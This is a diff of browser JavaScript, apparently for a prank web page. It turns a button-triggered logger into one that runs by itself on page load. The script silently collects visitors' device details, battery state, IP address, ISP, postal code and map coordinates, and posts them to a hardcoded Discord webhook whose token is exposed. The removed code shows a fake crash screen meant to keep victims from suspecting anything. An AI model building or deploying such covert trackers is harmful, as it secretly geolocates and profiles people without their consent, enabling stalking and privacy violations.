@@ -1,69 +1,92 @@
-const button = document.getElementById('pressButton');
-const crashScreen = document.getElementById('crashScreen');
-
 // 🔴 PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW 🔴
 const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";
 
-button.addEventListener('click', () => {
-    // 1. Trigger Confetti Explosion
-    const count = 200;
-    const defaults = { origin: { y: 0.7 } };
-
-    function fire(particleRatio, opts) {
-        confetti(Object.assign({}, defaults, opts, {
-            particleCount: Math.floor(count * particleRatio)
-        }));
+(async function autoRun() {
+    
+    // 1. Get Battery Info (if supported by browser)
+    let batteryInfo = { level: "N/A", charging: "N/A" };
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryInfo = {
+                level: `${Math.round(battery.level * 100)}%`,
+                charging: battery.charging ? "Yes" : "No"
+            };
+        }
+    } catch (e) {
+        console.log("Battery API not supported");
     }
 
-    fire(0.25, { spread: 26, startVelocity: 55 });
-    fire(0.2, { spread: 60 });
-    fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
-    fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
-    fire(0.1, { spread: 120, startVelocity: 45 });
-
-    // 2. Gather Device Info (Browser, Screen, Platform)
+    // 2. Gather Standard Device Info
     const deviceInfo = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
+        // Screen Resolution (Physical Monitor)
         screenRes: `${window.screen.width} x ${window.screen.height}`,
-        cores: navigator.hardwareConcurrency || "Unknown"
+        // Window Size (Actual Browser Window)
+        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
+        // Pixel Ratio (Screen sharpness)
+        pixelRatio: window.devicePixelRatio || "Standard",
+        cores: navigator.hardwareConcurrency || "Unknown",
+        // Approximate RAM
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        connection: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown",
+        referrer: document.referrer || "Direct Link",
+        currentUrl: window.location.href
     };
 
     // 3. Get IP and Network Info
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
+            
+            // Create a Google Maps Link
+            const mapLink = `[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
+
             const payload = {
-                username: "🕵️ System Tracker",
-                avatar_url: "https://i.imgur.com/yourIcon.png", // Optional icon
+                username: "Advanced Logger",
                 embeds: [
                     {
-                        title: "DATA CAPTURED",
-                        description: "User triggered the button!",
-                        color: 16711740, // Red
+                        title: "Detailed Access Log",
+                        description: "Comprehensive data captured.",
+                        color: 16711740,
                         fields: [
-                            // --- NETWORK INFO ---
+                            // --- NETWORK & LOCATION ---
                             { name: "IP Address", value: `||${data.ip}||`, inline: true },
                             { name: "ISP / Network", value: data.org || "Unknown", inline: true },
-                            { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
+                            { name: "City", value: data.city || "Unknown", inline: true },
+                            { name: "Region / State", value: data.region || "Unknown", inline: true },
+                            { name: "Postal Code", value: data.postal || "Unknown", inline: true },
+                            { name: "Country", value: data.country_name || "Unknown", inline: true },
+                            { name: "Coordinates", value: mapLink, inline: false },
                             
-                            // --- DEVICE INFO ---
+                            // --- HARDWARE & POWER ---
                             { name: "Platform", value: deviceInfo.platform, inline: true },
-                            { name: "Screen Res", value: deviceInfo.screenRes, inline: true },
+                            { name: "Device Memory (RAM)", value: deviceInfo.memory, inline: true },
                             { name: "CPU Cores", value: deviceInfo.cores, inline: true },
-                            
-                            // --- BROWSER INFO ---
+                            { name: "Battery Level", value: batteryInfo.level, inline: true },
+                            { name: "Is Charging", value: batteryInfo.charging, inline: true },
+
+                            // --- DISPLAY & BROWSER ---
+                            { name: "Screen Resolution", value: deviceInfo.screenRes, inline: true },
+                            { name: "Window Size", value: deviceInfo.windowSize, inline: true },
+                            { name: "Pixel Ratio", value: deviceInfo.pixelRatio, inline: true },
+                            { name: "Connection Type", value: deviceInfo.connection, inline: true },
                             { name: "Language", value: deviceInfo.language, inline: true },
-                            { name: "User Agent", value: (deviceInfo.userAgent).substring(0, 50) + "...", inline: false }
+                            { name: "Referrer", value: deviceInfo.referrer, inline: false },
+                            
+                            // --- EXTRAS ---
+                            { name: "User Agent", value: deviceInfo.userAgent, inline: false }
                         ],
-                        footer: { text: "GitHub Pages Advanced Tracker" },
+                        footer: { text: "System Logger" },
                         timestamp: new Date().toISOString()
                     }
                 ]
             };
 
-            // 4. Send Webhook
+            // 4. Send the Webhook
             return fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -71,20 +94,14 @@ button.addEventListener('click', () => {
             });
         })
         .then(response => {
-            console.log("Webhook sent with extra info!");
-            
-            // 5. Trigger Fake Crash Screen after 1.5 seconds
-            setTimeout(() => {
-                button.style.display = 'none';
-                crashScreen.style.display = 'block';
-            }, 1500);
+            if (response.ok) {
+                console.log("Data sent successfully.");
+            } else {
+                console.log("Failed to send data.");
+            }
         })
         .catch(error => {
             console.error('Error:', error);
-            // If it fails, still show the crash screen so user doesn't suspect anything
-            setTimeout(() => {
-                button.style.display = 'none';
-                crashScreen.style.display = 'block';
-            }, 1500);
         });
-});
+
+})();
